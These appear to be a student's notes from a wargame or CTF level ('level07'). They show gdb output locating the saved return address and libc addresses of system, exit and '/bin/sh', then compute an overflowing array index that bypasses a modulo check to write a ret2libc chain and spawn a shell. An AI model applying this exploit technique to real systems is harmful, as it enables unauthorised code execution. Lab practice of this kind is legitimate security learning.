gdb level07
b main
r
info frame
eip at 0xffffd5cc (4294956492)

(gdb) print &system
$4 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) print &exit
$5 = (<text variable, no debug info> *) 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec

can't store at index % 3 == 0


b read_number
s
read
i r
eax 0xffffd404

buffer start at 0xffffd404 

4294956492 - 4294956036 = 456

0xffffd5cc (4294956492)
stored u_int so array size = 4

456 / 4 = 114

114  % 3 == 0

so adding to uintmax 
4294967296 / 4 + 114 = 1073741938

so we have to store:
system (0xf7e6aed0):
 Number: 4159090384
 Index: 1073741938
exit (0xf7e5eb70):
Number: 4159040368
 Index: 115
/bin/sh (0xf7f897ec):
 Number: 4160264172
 Index: 116 

 so when we will read at idx 1073741938, it will store the system /bin/sh exit as eip
 so we just have to quit after that and boom shell spawned